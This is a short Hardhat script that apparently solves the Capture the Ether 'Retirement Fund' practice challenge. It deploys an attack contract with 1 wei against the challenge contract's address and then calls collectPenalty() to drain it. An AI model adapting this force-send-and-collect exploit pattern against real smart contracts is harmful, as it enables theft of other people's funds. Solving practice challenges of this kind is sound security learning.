import { ethers } from "hardhat";

const contractAddress = "0xb7810a4E52E8e0Aee24caE64998d2c03EB061c93";

async function main() {
  const challengeFactory = await ethers.getContractFactory("RetirementFundChallenge");
  const challengeContract = challengeFactory.attach(contractAddress);

  const attackFactory = await ethers.getContractFactory("RetirementFundAttack");
  await attackFactory.deploy(contractAddress, { value: 1 });

  const tx = await challengeContract.collectPenalty();
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
